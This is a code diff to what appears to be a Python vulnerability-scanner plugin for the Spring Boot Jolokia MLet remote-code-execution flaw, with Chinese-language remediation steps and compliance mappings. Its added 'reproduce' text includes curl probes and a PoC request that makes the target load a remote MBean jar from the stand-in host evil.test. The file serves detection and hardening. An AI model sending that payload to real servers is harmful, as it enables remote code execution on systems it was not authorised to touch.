@@ -16,11 +16,43 @@ JOLOKIA_MLET_MARKER = 'spring-jolokia-mlet-rce-confirmed'
 
 class SpringJolokiaMletRcePlugin(PluginBase):
     name = 'Spring Boot Actuator Jolokia MLet 链远程代码执行'
-    cve = ''
+    cve = 'N/A'
     severity = 'high'
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
     category = 'vuln'
     description = 'Jolokia /actuator/jolokia/list 可被滥用通过 MLet 加载远程 MBean 触发 RCE'
     fix = '移除 jolokia 依赖或禁用 Jolokia 端点；为 /actuator/jolokia 配置认证；限制 MBean 加载'
+    fix_detail = (
+        '【移除依赖】pom.xml 删除 jolokia-core 依赖：\n'
+        '  <dependency><groupId>org.jolokia</groupId><artifactId>jolokia-core</artifactId></dependency>\n'
+        '【配置加固】application.yml 禁用 jolokia 端点：\n'
+        '  management.endpoints.web.exposure.exclude: jolokia\n'
+        '  management.endpoint.jolokia.enabled: false\n'
+        '【SecurityConfig】为 jolokia 端点配置角色并限制 MBean 操作：\n'
+        '  .antMatchers("/actuator/jolokia/**").hasRole("ADMIN")\n'
+        '【JVM 加固】JVM 启动参数禁用远程 MBean 加载：\n'
+        '  -Dcom.sun.management.jmxremote.authenticate=true\n'
+        '  配置 jolokia 的 MBean 白名单，禁止 MLet / reloadByURL 操作\n'
+        '【WAF 规则】拦截外网对 /actuator/jolokia 的 GET/POST，阻断 MLet 远程加载\n'
+        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制'
+    )
+    reproduce = (
+        '# 1. 探测 Jolokia 端点可达性：\n'
+        'curl -i "http://target/actuator/jolokia/list"\n'
+        '\n'
+        '# 2. 列出全部已注册 JMX MBean（信息收集）：\n'
+        'curl "http://target/actuator/jolokia/list" | python -m json.tool | head -200\n'
+        '  # 返回 JSON 含 MBean 域列表即 Jolokia 暴露\n'
+        '\n'
+        '# 3. 通过 MLet 加载远程恶意 MBean（PoC，请勿对未授权目标使用）：\n'
+        'curl -X POST "http://target/actuator/jolokia/" \\\n'
+        '  -H "Content-Type: application/json" \\\n'
+        '  -d \'{"type":"EXEC","mbean":"JMImplementation:type=MLet","operation":"getMBeansFromURL","arguments":["http://evil.test/mlet.jar"]}\'\n'
+        '\n'
+        '# 预期响应：list 返回 200 + MBean 域列表即漏洞存在'
+    )
 
     def verify(self, target, session):
         url = join_url(target, '/actuator/jolokia/list')
